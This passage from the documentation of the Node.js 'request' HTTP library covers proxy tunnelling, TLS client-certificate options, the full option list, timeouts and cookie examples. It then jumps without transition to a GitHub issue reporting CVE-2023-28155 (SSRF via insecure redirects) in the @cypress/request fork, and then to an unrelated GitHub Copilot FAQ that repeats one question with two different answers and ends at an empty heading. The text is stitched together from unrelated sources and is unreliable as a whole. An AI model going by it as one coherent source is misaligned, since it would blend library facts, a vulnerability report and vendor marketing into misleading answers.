HTTP/1.1 CONNECT endpoint-server.com:80
Host: proxy-server.com
User-Agent: whatever user agent you specify

```

and then the proxy server make a TCP connection to `endpoint-server`
on port `80`, and return a response that looks like:

```
HTTP/1.1 200 OK

```

At this point, the connection is left open, and the client is
communicating directly with the `endpoint-server.com` machine.

See [the wikipedia page on HTTP Tunneling](https://en.wikipedia.org/wiki/HTTP_tunnel)
for more information.

By default, when proxying `http` traffic, request will simply make a
standard proxied `http` request. This is done by making the `url`
section of the initial line of the request a fully qualified url to
the endpoint.

For example, it will make a single request that looks like:

```
HTTP/1.1 GET http://endpoint-server.com/some-url
Host: proxy-server.com
Other-Headers: all go here

request body or whatever

```

Because a pure "http over http" tunnel offers no additional security
or other features, it is generally simpler to go with a
straightforward HTTP proxy in this case. However, if you would like
to force a tunneling proxy, you may set the `tunnel` option to `true`.

You can also make a standard proxied `http` request by explicitly setting
`tunnel : false`, but **note that this will allow the proxy to see the traffic
to/from the destination server**.

If you are using a tunneling proxy, you may set the
`proxyHeaderWhiteList` to share certain headers with the proxy.

You can also set the `proxyHeaderExclusiveList` to share certain
headers only with the proxy and not with destination host.

By default, this set is:

```
accept
accept-charset
accept-encoding
accept-language
accept-ranges
cache-control
content-encoding
content-language
content-length
content-location
content-md5
content-range
content-type
connection
date
expect
max-forwards
pragma
proxy-authorization
referer
te
transfer-encoding
user-agent
via

```

Note that, when using a tunneling proxy, the `proxy-authorization`
header and any headers from custom `proxyHeaderExclusiveList` are
*never* sent to the endpoint server, but only to the proxy server.

### Controlling proxy behaviour using environment variables

The following environment variables are respected by `request`:

* `HTTP_PROXY` / `http_proxy`
* `HTTPS_PROXY` / `https_proxy`
* `NO_PROXY` / `no_proxy`

When `HTTP_PROXY` / `http_proxy` are set, they will be used to proxy non-SSL requests that do not have an explicit `proxy` configuration option present. Similarly, `HTTPS_PROXY` / `https_proxy` will be respected for SSL requests that do not have an explicit `proxy` configuration option. It is valid to define a proxy in one of the environment variables, but then override it for a specific request, using the `proxy` configuration option. Furthermore, the `proxy` configuration option can be explicitly set to false / null to opt out of proxying altogether for that request.

`request` is also aware of the `NO_PROXY`/`no_proxy` environment variables. These variables provide a granular way to opt out of proxying, on a per-host basis. It should contain a comma separated list of hosts to opt out of proxying. It is also possible to opt of proxying when a particular destination port is used. Finally, the variable may be set to `*` to opt out of the implicit proxy configuration of the other environment variables.

Here's some examples of valid `no_proxy` values:

* `google.com` - don't proxy HTTP/HTTPS requests to Google.
* `google.com:443` - don't proxy HTTPS requests to Google, but *do* proxy HTTP requests to Google.
* `google.com:443, yahoo.com:80` - don't proxy HTTPS requests to Google, and don't proxy HTTP requests to Yahoo!
* `*` - ignore `https_proxy`/`http_proxy` environment variables altogether.

## UNIX Domain Sockets

`request` supports making requests to [UNIX Domain Sockets](https://en.wikipedia.org/wiki/Unix_domain_socket). To make one, use the following URL scheme:

```
/* Pattern */ 'http://unix:SOCKET:PATH'
/* Example */ request.get('http://unix:/absolute/path/to/unix.socket:/request/path')
```

Note: The `SOCKET` path is assumed to be absolute to the root of the host file system.

## TLS/SSL Protocol

TLS/SSL Protocol options, such as `cert`, `key` and `passphrase`, can be
set directly in `options` object, in the `agentOptions` property of the `options` object, or even in `https.globalAgent.options`. Keep in mind that, although `agentOptions` allows for a slightly wider range of configurations, the recommended way is via `options` object directly, as using `agentOptions` or `https.globalAgent.options` would not be applied in the same way in proxied environments (as data travels through a TLS connection instead of an http/https agent).

```
const fs = require('fs')
    , path = require('path')
    , certFile = path.resolve(__dirname, 'ssl/client.crt')
    , keyFile = path.resolve(__dirname, 'ssl/client.key')
    , caFile = path.resolve(__dirname, 'ssl/ca.cert.pem')
    , request = require('request');

const options = {
    url: 'https://api.some-server.com/',
    cert: fs.readFileSync(certFile),
    key: fs.readFileSync(keyFile),
    passphrase: 'password',
    ca: fs.readFileSync(caFile)
};

request.get(options);
```

### Using `options.agentOptions`

In the example below, we call an API that requires client side SSL certificate
(in PEM format) with passphrase protected private key (in PEM format) and disable the SSLv3 protocol:

```
const fs = require('fs')
    , path = require('path')
    , certFile = path.resolve(__dirname, 'ssl/client.crt')
    , keyFile = path.resolve(__dirname, 'ssl/client.key')
    , request = require('request');

const options = {
    url: 'https://api.some-server.com/',
    agentOptions: {
        cert: fs.readFileSync(certFile),
        key: fs.readFileSync(keyFile),
        // Or use `pfx` property replacing `cert` and `key` when using private key, certificate and CA certs in PFX or PKCS12 format:
        // pfx: fs.readFileSync(pfxFilePath),
        passphrase: 'password',
        securityOptions: 'SSL_OP_NO_SSLv3'
    }
};

request.get(options);
```

It is able to force using SSLv3 only by specifying `secureProtocol`:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        secureProtocol: 'SSLv3_method'
    }
});
```

It is possible to accept other certificates than those signed by generally allowed Certificate Authorities (CAs).
This can be useful, for example, when using self-signed certificates.
To require a different root certificate, you can specify the signing CA by adding the contents of the CA's certificate file to the `agentOptions`.
The certificate the domain presents must be signed by the root certificate specified:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        ca: fs.readFileSync('ca.cert.pem')
    }
});
```

The `ca` value can be an array of certificates, in the event you have a private or internal corporate public-key infrastructure hierarchy. For example, if you want to connect to <https://api.some-server.com> which presents a key chain consisting of:

1. its own public key, which is signed by:
2. an intermediate "Corp Issuing Server", that is in turn signed by:
3. a root CA "Corp Root CA";

you can configure your request as follows:

```
request.get({
    url: 'https://api.some-server.com/',
    agentOptions: {
        ca: [
          fs.readFileSync('Corp Issuing Server.pem'),
          fs.readFileSync('Corp Root CA.pem')
        ]
    }
});
```

## Support for HAR 1.2

The `options.har` property will override the values: `url`, `method`, `qs`, `headers`, `form`, `formData`, `body`, `json`, as well as construct multipart data and read files from disk when `request.postData.params[].fileName` is present without a matching `value`.

A validation step will check if the HAR Request format matches the latest spec (v1.2) and will skip parsing if not matching.

```
  const request = require('request')
  request({
    // will be ignored
    method: 'GET',
    uri: 'http://www.google.com',

    // HTTP Archive Request Object
    har: {
      url: 'http://www.mockbin.com/har',
      method: 'POST',
      headers: [
        {
          name: 'content-type',
          value: 'application/x-www-form-urlencoded'
        }
      ],
      postData: {
        mimeType: 'application/x-www-form-urlencoded',
        params: [
          {
            name: 'foo',
            value: 'bar'
          },
          {
            name: 'hello',
            value: 'world'
          }
        ]
      }
    }
  })

  // a POST request will be sent to http://www.mockbin.com
  // with body an application/x-www-form-urlencoded body:
  // foo=bar&hello=world
```

## request(options, callback)

The first argument can be either a `url` or an `options` object. The only required option is `uri`; all others are optional.

* `uri` || `url` - fully qualified uri or a parsed url object from `url.parse()`
* `baseUrl` - fully qualified uri string used as the base url. Most useful with `request.defaults`, for example when you want to do many requests to the same domain. If `baseUrl` is `https://example.com/api/`, then requesting `/end/point?test=true` will fetch `https://example.com/api/end/point?test=true`. When `baseUrl` is given, `uri` must also be a string.
* `method` - http method (default: `"GET"`)
* `headers` - http headers (default: `{}`)

---

* `qs` - object containing querystring values to be appended to the `uri`
* `qsParseOptions` - object containing options to pass to the [qs.parse](https://github.com/hapijs/qs#parsing-objects) method. Alternatively pass options to the [querystring.parse](https://nodejs.org/docs/v0.12.0/api/querystring.html#querystring_querystring_parse_str_sep_eq_options) method using this format `{sep:';', eq:':', options:{}}`
* `qsStringifyOptions` - object containing options to pass to the [qs.stringify](https://github.com/hapijs/qs#stringifying) method. Alternatively pass options to the [querystring.stringify](https://nodejs.org/docs/v0.12.0/api/querystring.html#querystring_querystring_stringify_obj_sep_eq_options) method using this format `{sep:';', eq:':', options:{}}`. For example, to change the way arrays are converted to query strings using the `qs` module pass the `arrayFormat` option with one of `indices|brackets|repeat`
* `useQuerystring` - if true, use `querystring` to stringify and parse
  querystrings, otherwise use `qs` (default: `false`). Set this option to
  `true` if you need arrays to be serialized as `foo=bar&foo=baz` instead of the
  default `foo[0]=bar&foo[1]=baz`.

---

* `body` - entity body for PATCH, POST and PUT requests. Must be a `Buffer`, `String` or `ReadStream`. If `json` is `true`, then `body` must be a JSON-serializable object.
* `form` - when passed an object or a querystring, this sets `body` to a querystring representation of value, and adds `Content-type: application/x-www-form-urlencoded` header. When passed no options, a `FormData` instance is returned (and is piped to request). See "Forms" section above.
* `formData` - data to pass for a `multipart/form-data` request. See
  [Forms](#forms) section above.
* `multipart` - array of objects which contain their own headers and `body`
  attributes. Sends a `multipart/related` request. See [Forms](#forms) section
  above.
  + Alternatively you can pass in an object `{chunked: false, data: []}` where
    `chunked` is used to specify whether the request is sent in
    [chunked transfer encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)
    In non-chunked requests, data items with body streams are not allowed.
* `preambleCRLF` - append a newline/CRLF before the boundary of your `multipart/form-data` request.
* `postambleCRLF` - append a newline/CRLF at the end of the boundary of your `multipart/form-data` request.
* `json` - sets `body` to JSON representation of value and adds `Content-type: application/json` header. Additionally, parses the response body as JSON.
* `jsonReviver` - a [reviver function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse) that will be passed to `JSON.parse()` when parsing a JSON response body.
* `jsonReplacer` - a [replacer function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify) that will be passed to `JSON.stringify()` when stringifying a JSON request body.

---

* `auth` - a hash containing values `user` || `username`, `pass` || `password`, and `sendImmediately` (optional). See documentation above.
* `oauth` - options for OAuth HMAC-SHA1 signing. See documentation above.
* `hawk` - options for [Hawk signing](https://github.com/hueniverse/hawk). The `credentials` key must contain the necessary signing info, [see hawk docs for details](https://github.com/hueniverse/hawk#usage-example).
* `aws` - `object` containing AWS signing information. Should have the properties `key`, `secret`, and optionally `session` (note that this only works for services that require session as part of the canonical string). Also requires the property `bucket`, unless you’re specifying your `bucket` as part of the path, or the request doesn’t use a bucket (i.e. GET Services). If you want to use AWS sign version 4 use the parameter `sign_version` with value `4` otherwise the default is version 2. If you are using SigV4, you can also include a `service` property that specifies the service name. **Note:** you need to `npm install aws4` first.
* `httpSignature` - options for the [HTTP Signature Scheme](https://github.com/joyent/node-http-signature/blob/master/http_signing.md) using [Joyent's library](https://github.com/joyent/node-http-signature). The `keyId` and `key` properties must be specified. See the docs for other options.

---

* `followRedirect` - follow HTTP 3xx responses as redirects (default: `true`). This property can also be implemented as function which gets `response` object as a single argument and should return `true` if redirects should continue or `false` otherwise.
* `followAllRedirects` - follow non-GET HTTP 3xx responses as redirects (default: `false`)
* `followOriginalHttpMethod` - by default we redirect to HTTP method GET. you can enable this property to redirect to the original HTTP method (default: `false`)
* `maxRedirects` - the maximum number of redirects to follow (default: `10`)
* `removeRefererHeader` - removes the referer header when a redirect happens (default: `false`). **Note:** if true, referer header set in the initial request is preserved during redirect chain.

---

* `encoding` - encoding to be used on `setEncoding` of response data. If `null`, the `body` is returned as a `Buffer`. Anything else **(including the default value of `undefined`)** will be passed as the [encoding](http://nodejs.org/api/buffer.html#buffer_buffer) parameter to `toString()` (meaning this is effectively `utf8` by default). (**Note:** if you expect binary data, you should set `encoding: null`.)
* `gzip` - if `true`, add an `Accept-Encoding` header to request compressed content encodings from the server (if not already present) and decode supported content encodings in the response. **Note:** Automatic decoding of the response content is performed on the body data returned through `request` (both through the `request` stream and passed to the callback function) but is not performed on the `response` stream (available from the `response` event) which is the unmodified `http.IncomingMessage` object which may contain compressed data. See example below.
* `jar` - if `true`, remember cookies for future use (or define your custom cookie jar; see examples section)

---

* `agent` - `http(s).Agent` instance to use
* `agentClass` - alternatively specify your agent's class name
* `agentOptions` - and pass its options. **Note:** for HTTPS see [tls API doc for TLS/SSL options](http://nodejs.org/api/tls.html#tls_tls_connect_options_callback) and the [documentation above](#using-optionsagentoptions).
* `forever` - set to `true` to use the [forever-agent](https://github.com/request/forever-agent) **Note:** Defaults to `http(s).Agent({keepAlive:true})` in node 0.12+
* `pool` - an object describing which agents to use for the request. If this option is omitted the request will use the global agent (as long as your options allow for it). Otherwise, request will search the pool for your custom agent. If no custom agent is found, a new agent will be created and added to the pool. **Note:** `pool` is used only when the `agent` option is not specified.
  + A `maxSockets` property can also be provided on the `pool` object to set the max number of sockets for all agents created (ex: `pool: {maxSockets: Infinity}`).
  + Note that if you are sending multiple requests in a loop and creating
    multiple new `pool` objects, `maxSockets` will not work as intended. To
    work around this, either use [`request.defaults`](#requestdefaultsoptions)
    with your pool options or create the pool object with the `maxSockets`
    property outside of the loop.
* `timeout` - integer containing number of milliseconds, controls two timeouts.
  + **Read timeout**: Time to wait for a server to send response headers (and start the response body) before aborting the request.
  + **Connection timeout**: Sets the socket to timeout after `timeout` milliseconds of inactivity. Note that increasing the timeout beyond the OS-wide TCP connection timeout will not have any effect ([the default in Linux can be anywhere from 20-120 seconds](http://www.sekuda.com/overriding_the_default_linux_kernel_20_second_tcp_socket_connect_timeout))

---

* `localAddress` - local interface to bind for network connections.
* `proxy` - an HTTP proxy to be used. Supports proxy Auth with Basic Auth, identical to support for the `url` parameter (by embedding the auth info in the `uri`)
* `strictSSL` - if `true`, requires SSL certificates be valid. **Note:** to use your own certificate authority, you need to specify an agent that was created with that CA as an option.
* `tunnel` - controls the behavior of
  [HTTP `CONNECT` tunneling](https://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_tunneling)
  as follows:
  + `undefined` (default) - `true` if the destination is `https`, `false` otherwise
  + `true` - always tunnel to the destination by making a `CONNECT` request to
    the proxy
  + `false` - request the destination as a `GET` request.
* `proxyHeaderWhiteList` - a whitelist of headers to send to a
  tunneling proxy.
* `proxyHeaderExclusiveList` - a whitelist of headers to send
  exclusively to a tunneling proxy and not to destination.

---

* `time` - if `true`, the request-response cycle (including all redirects) is timed at millisecond resolution. When set, the following properties are added to the response object:

  + `elapsedTime` Duration of the entire request/response in milliseconds (*deprecated*).
  + `responseStartTime` Timestamp when the response began (in Unix Epoch milliseconds) (*deprecated*).
  + `timingStart` Timestamp of the start of the request (in Unix Epoch milliseconds).
  + `timings` Contains event timestamps in millisecond resolution relative to `timingStart`. If there were redirects, the properties reflect the timings of the final request in the redirect chain:
    - `socket` Relative timestamp when the [`http`](https://nodejs.org/api/http.html#http_event_socket) module's `socket` event fires. This happens when the socket is assigned to the request.
    - `lookup` Relative timestamp when the [`net`](https://nodejs.org/api/net.html#net_event_lookup) module's `lookup` event fires. This happens when the DNS has been resolved.
    - `connect`: Relative timestamp when the [`net`](https://nodejs.org/api/net.html#net_event_connect) module's `connect` event fires. This happens when the server acknowledges the TCP connection.
    - `response`: Relative timestamp when the [`http`](https://nodejs.org/api/http.html#http_event_response) module's `response` event fires. This happens when the first bytes are received from the server.
    - `end`: Relative timestamp when the last bytes of the response are received.
  + `timingPhases` Contains the durations of each request phase. If there were redirects, the properties reflect the timings of the final request in the redirect chain:
    - `wait`: Duration of socket initialization (`timings.socket`)
    - `dns`: Duration of DNS lookup (`timings.lookup` - `timings.socket`)
    - `tcp`: Duration of TCP connection (`timings.connect` - `timings.socket`)
    - `firstByte`: Duration of HTTP server response (`timings.response` - `timings.connect`)
    - `download`: Duration of HTTP download (`timings.end` - `timings.response`)
    - `total`: Duration entire HTTP round-trip (`timings.end`)
* `har` - a [HAR 1.2 Request Object](http://www.softwareishard.com/blog/har-12-spec/#request), will be processed from HAR format into options overwriting matching values *(see the [HAR 1.2 section](#support-for-har-12) for details)*
* `callback` - alternatively pass the request's callback in the options object

The callback argument gets 3 arguments:

1. An `error` when applicable (usually from [`http.ClientRequest`](http://nodejs.org/api/http.html#http_class_http_clientrequest) object)
2. An [`http.IncomingMessage`](https://nodejs.org/api/http.html#http_class_http_incomingmessage) object (Response object)
3. The third is the `response` body (`String` or `Buffer`, or JSON object if the `json` option is supplied)

## Convenience methods

There are also shorthand methods for different HTTP METHODs and some other conveniences.

### request.defaults(options)

This method **returns a wrapper** around the normal request API that defaults
to whatever options you pass to it.

**Note:** `request.defaults()` **does not** modify the global request API;
instead, it **returns a wrapper** that has your default settings applied to it.

**Note:** You can call `.defaults()` on the wrapper that is returned from
`request.defaults` to add/override defaults that were previously defaulted.

For example:

```
//requests using baseRequest() will set the 'x-token' header
const baseRequest = request.defaults({
  headers: {'x-token': 'my-token'}
})

//requests using specialRequest() will include the 'x-token' header set in
//baseRequest and will also include the 'special' header
const specialRequest = baseRequest.defaults({
  headers: {special: 'special value'}
})
```

### request.METHOD()

These HTTP method convenience functions act just like `request()` but with a default method already set for you:

* *request.get()*: Defaults to `method: "GET"`.
* *request.post()*: Defaults to `method: "POST"`.
* *request.put()*: Defaults to `method: "PUT"`.
* *request.patch()*: Defaults to `method: "PATCH"`.
* *request.del() / request.delete()*: Defaults to `method: "DELETE"`.
* *request.head()*: Defaults to `method: "HEAD"`.
* *request.options()*: Defaults to `method: "OPTIONS"`.

### request.cookie()

Function that creates a new cookie.

```
request.cookie('key1=value1')
```

### request.jar()

Function that creates a new cookie jar.

```
request.jar()
```

### response.caseless.get('header-name')

Function that returns the specified response header field using a [case-insensitive match](https://tools.ietf.org/html/rfc7230#section-3.2)

```
request('http://www.google.com', function (error, response, body) {
  // print the Content-Type header even if the server returned it as 'content-type' (lowercase)
  console.log('Content-Type is:', response.caseless.get('Content-Type'));
});
```

## Debugging

There are at least three ways to debug the operation of `request`:

1. Launch the node process like `NODE_DEBUG=request node script.js`
   (`lib,request,otherlib` works too).
2. Set `require('request').debug = true` at any time (this does the same thing
   as #1).
3. Use the [request-debug module](https://github.com/request/request-debug) to
   view request and response headers and bodies.

[back to top](#table-of-contents)

---

## Timeouts

Most requests to external servers should have a timeout attached, in case the
server is not responding in a timely manner. Without a timeout, your code may
have a socket open/consume resources for minutes or more.

There are two main types of timeouts: **connection timeouts** and **read
timeouts**. A connect timeout occurs if the timeout is hit while your client is
attempting to establish a connection to a remote machine (corresponding to the
[connect() call](http://linux.die.net/man/2/connect) on the socket). A read timeout occurs any time the
server is too slow to send back a part of the response.

These two situations have widely different implications for what went wrong
with the request, so it's useful to be able to distinguish them. You can detect
timeout errors by checking `err.code` for an 'ETIMEDOUT' value. Further, you
can detect whether the timeout was a connection timeout by checking if the
`err.connect` property is set to `true`.

```
request.get('http://10.255.255.1', {timeout: 1500}, function(err) {
    console.log(err.code === 'ETIMEDOUT');
    // Set to `true` if the timeout was a connection timeout, `false` or
    // `undefined` otherwise.
    console.log(err.connect === true);
    process.exit(0);
});
```

## Examples:

```
  const request = require('request')
    , rand = Math.floor(Math.random()*100000000).toString()
    ;
  request(
    { method: 'PUT'
    , uri: 'http://mikeal.iriscouch.com/testjs/' + rand
    , multipart:
      [ { 'content-type': 'application/json'
        ,  body: JSON.stringify({foo: 'bar', _attachments: {'message.txt': {follows: true, length: 18, 'content_type': 'text/plain' }}})
        }
      , { body: 'I am an attachment' }
      ]
    }
  , function (error, response, body) {
      if(response.statusCode == 201){
        console.log('document saved as: http://mikeal.iriscouch.com/testjs/'+ rand)
      } else {
        console.log('error: '+ response.statusCode)
        console.log(body)
      }
    }
  )
```

For backwards-compatibility, response compression is not supported by default.
To accept gzip-compressed responses, set the `gzip` option to `true`. Note
that the body data passed through `request` is automatically decompressed
while the response object is unmodified and will contain compressed data if
the server sent a compressed response.

```
  const request = require('request')
  request(
    { method: 'GET'
    , uri: 'http://www.google.com'
    , gzip: true
    }
  , function (error, response, body) {
      // body is the decompressed response body
      console.log('server encoded the data as: ' + (response.headers['content-encoding'] || 'identity'))
      console.log('the decoded data is: ' + body)
    }
  )
  .on('data', function(data) {
    // decompressed data as it is received
    console.log('decoded chunk: ' + data)
  })
  .on('response', function(response) {
    // unmodified http.IncomingMessage object
    response.on('data', function(data) {
      // compressed data as it is received
      console.log('received ' + data.length + ' bytes of compressed data')
    })
  })
```

Cookies are disabled by default (else, they would be used in subsequent requests). To enable cookies, set `jar` to `true` (either in `defaults` or `options`).

```
const request = request.defaults({jar: true})
request('http://www.google.com', function () {
  request('http://images.google.com')
})
```

To use a custom cookie jar (instead of `request`’s global cookie jar), set `jar` to an instance of `request.jar()` (either in `defaults` or `options`)

```
const j = request.jar()
const request = request.defaults({jar:j})
request('http://www.google.com', function () {
  request('http://images.google.com')
})
```

OR

```
const j = request.jar();
const cookie = request.cookie('key1=value1');
const url = 'http://www.google.com';
j.setCookie(cookie, url);
request({url: url, jar: j}, function () {
  request('http://images.google.com')
})
```

To use a custom cookie store (such as a
[`FileCookieStore`](https://github.com/mitsuru/tough-cookie-filestore)
which supports saving to and restoring from JSON files), pass it as a parameter
to `request.jar()`:

```
const FileCookieStore = require('tough-cookie-filestore');
// NOTE - currently the 'cookies.json' file must already exist!
const j = request.jar(new FileCookieStore('cookies.json'));
request = request.defaults({ jar : j })
request('http://www.google.com', function() {
  request('http://images.google.com')
})
```

The cookie store must be a
[`tough-cookie`](https://github.com/SalesforceEng/tough-cookie)
store and it must support synchronous operations; see the
[`CookieStore` API docs](https://github.com/SalesforceEng/tough-cookie#api)
for details.

To inspect your cookie jar after a request:

```
const j = request.jar()
request({url: 'http://www.google.com', jar: j}, function () {
  const cookie_string = j.getCookieString(url); // "key1=value1; key2=value2; ..."
  const cookies = j.getCookies(url);
  // [{key: 'key1', value: 'value1', domain: "www.google.com", ...}, ...]
})
```

## Description

![@khitrenovich](https://avatars.githubusercontent.com/u/3424762?u=48ed1aa97c89d6504c9b4259abc7871b76f681e1&v=4&size=48)[khitrenovich](https://github.com/khitrenovich)opened [on Mar 23, 2023](https://github.com/cypress-io/request/issues/27#issue-1637602284)

Being a fork of the original `request` package, `@cypress/request` is vulnerable to [CVE-2023-28155](https://github.com/advisories/GHSA-p8p7-x288-28g6) (SSRF via insecure redirects). There is [an issue](https://github.com/request/request/pull/3442) and [an open PR](https://github.com/request/request/pull/3444) in the `request` repo, but the fix is unlikely to be merged since `request` is long abandoned. This fork is the second most popular fork, it would be great to have it patched.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

